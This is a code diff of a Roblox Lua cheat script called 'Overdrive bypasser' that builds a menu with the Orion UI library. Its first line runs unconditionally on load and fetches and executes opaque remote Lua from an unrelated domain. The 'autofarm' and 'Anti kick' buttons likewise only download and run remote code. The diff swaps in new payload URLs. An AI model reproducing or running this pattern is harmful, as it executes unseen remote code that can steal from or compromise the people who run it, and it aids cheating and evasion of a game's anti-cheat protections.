@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", true))()
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 local Window = OrionLib:MakeWindow({Name = "Overdrive bypasser", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
@@ -10,8 +10,8 @@ local Tab = Window:MakeTab({
 Tab:AddButton({
     Name = "autofarm",
     Callback = function()
-loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", true))()
-              print("button pressed")
+loadstring(game:HttpGet("https://overdrivehub.odh.workers.dev/?d=auth&script=mm2_lite"))()
+print("button pressed")
       end 
 })
 Tab:AddToggle({
@@ -25,8 +25,8 @@ Tab:AddToggle({
     Name = "Anti kick (recommend using)",
     Default = false,
     Callback = function(Value)
-loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", true))()
-        print(Value)
+loadstring(game:HttpGet("https://overdrivehub.odh.workers.dev/?d=auth&script=mm2_lite"))()
+print(Value)
     end
 })
 local Tab = Window:MakeTab({
